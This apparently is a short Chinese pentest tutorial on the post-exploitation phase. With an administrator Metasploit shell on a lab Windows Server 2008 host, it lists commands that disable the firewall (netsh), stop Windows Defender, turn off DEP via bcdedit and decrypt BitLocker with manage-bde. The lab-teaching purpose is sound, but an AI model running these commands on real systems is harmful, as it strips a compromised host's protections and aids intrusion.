# 后渗透利用msf关闭防火墙

运行环境：

kali工具msf         ip：192.168.2.136

windows server2008    ip：192.168.2.132

  
已经拿到目标服务器权限，开始后渗透

  
![](../Images/49b113852bd64649034a8840e775304d.png)   
  

是administrator权限，为了后渗透方便我们需要把目标的服务器的杀毒，防火墙，以及一些防护软件给关闭了。  
  
![](../Images/ef6f9ab0eb3f070c8c76ece22ee9817a.png)   
  
目标服务器防火墙开着，我们要使用我们得到的shell给它关闭

  
关闭windows防火墙需要管理员或system权限  
  
![](../Images/00d3e90a64683fbf3bcc0e45f856dc72.png)   

  

我们使用上边netsh advfirewall set allprofiles state off命令来关闭  
我们看下服务器  
  
![](../Images/8d073a91ddeddc12fe5e83019ab7cb6a.png)   
  
然后再关闭windefebd  
命令 net stop windefend  
关闭DEP  
命令 bcdedit.exe /set{current} nx AlwaysOff  
Bitlocker磁盘加密  
命令  manage-bde-off C:  
manage-bde-status C:
